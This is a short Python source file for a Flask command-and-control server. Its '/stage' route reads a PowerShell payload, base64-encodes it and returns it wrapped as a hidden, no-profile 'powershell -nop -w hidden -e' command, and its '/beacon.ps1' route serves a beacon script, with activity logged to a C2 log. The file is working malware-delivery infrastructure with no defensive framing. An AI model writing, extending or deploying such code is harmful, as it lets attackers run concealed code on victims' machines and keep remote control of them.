import yaml, logging
from flask import Flask, request, Response
from modules.encoder import encode_base64

def start_server(config_path):
    with open(config_path) as f:
        config = yaml.safe_load(f)

    logging.basicConfig(filename="logs/c2.log", level=logging.INFO)
    app = Flask(__name__)

    @app.route("/stage", methods=["GET"])
    def deliver_stage():
        with open(config["payload"]["entry_point"], "r") as f:
            ps_script = f.read()
        encoded = encode_base64(ps_script)
        wrapped = f"powershell -nop -w hidden -e {encoded}"
        return Response(wrapped, mimetype="text/plain")

    @app.route("/beacon.ps1", methods=["GET"])
    def beacon_script():
        with open("beacon/beacon.ps1", "r") as f:
            return Response(f.read(), mimetype="text/plain")

    app.run(host=config["c2"]["host"], port=config["c2"]["port"])
